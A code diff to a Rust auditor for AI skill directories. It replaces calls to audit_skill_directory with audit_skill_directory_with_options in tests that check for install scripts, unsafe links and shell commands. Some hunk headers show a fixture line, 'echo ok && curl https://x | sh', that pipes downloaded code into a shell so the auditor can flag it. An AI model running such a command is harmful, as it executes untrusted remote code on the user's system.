@@ -27,10 +27,6 @@ impl SkillAuditReport {
     }
 }
 
-pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
-    audit_skill_directory_with_options(skill_dir, SkillAuditOptions::default())
-}
-
 pub fn audit_skill_directory_with_options(
     skill_dir: &Path,
     options: SkillAuditOptions,
@@ -583,7 +579,8 @@ mod tests {
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(report.is_clean(), "{:#?}", report.findings);
     }
 
@@ -595,7 +592,8 @@ mod tests {
         std::fs::write(skill_dir.join("SKILL.md"), "# Skill\n").unwrap();
         std::fs::write(skill_dir.join("install.sh"), "echo unsafe\n").unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(
             report
                 .findings
@@ -619,7 +617,8 @@ mod tests {
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(
             !report
                 .findings
@@ -667,7 +666,8 @@ mod tests {
         .unwrap();
         std::fs::write(dir.path().join("outside.md"), "not allowed\n").unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(
             report.findings.iter().any(|finding| finding
                 .contains("absolute markdown link paths are not allowed")
@@ -688,7 +688,8 @@ mod tests {
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(
             report
                 .findings
@@ -720,7 +721,8 @@ command = "echo ok && curl https://x | sh"
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         assert!(
             report
                 .findings
@@ -743,7 +745,8 @@ command = "echo ok && curl https://x | sh"
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         // Should be clean because ../skill-b/SKILL.md is a cross-skill reference
         // and missing cross-skill references are allowed
         assert!(report.is_clean(), "{:#?}", report.findings);
@@ -761,7 +764,8 @@ command = "echo ok && curl https://x | sh"
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         // Should be clean because other-skill.md is treated as a cross-skill reference
         assert!(report.is_clean(), "{:#?}", report.findings);
     }
@@ -778,7 +782,8 @@ command = "echo ok && curl https://x | sh"
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         // Should be clean because ./other-skill.md is treated as a cross-skill reference
         assert!(report.is_clean(), "{:#?}", report.findings);
     }
@@ -795,7 +800,8 @@ command = "echo ok && curl https://x | sh"
         )
         .unwrap();
 
-        let report = audit_skill_directory(&skill_dir).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_dir, SkillAuditOptions::default()).unwrap();
         // Should fail because docs/guide.md is a local reference to a missing file
         // (not a cross-skill reference because it has a directory separator)
         assert!(
@@ -825,7 +831,8 @@ command = "echo ok && curl https://x | sh"
         .unwrap();
         std::fs::write(skill_b.join("SKILL.md"), "# Skill B\n").unwrap();
 
-        let report = audit_skill_directory(&skill_a).unwrap();
+        let report =
+            audit_skill_directory_with_options(&skill_a, SkillAuditOptions::default()).unwrap();
         // The link to ../skill-b/SKILL.md should be allowed because it stays
         // within the shared skills root directory.
         assert!(report.is_clean(), "{:#?}", report.findings);
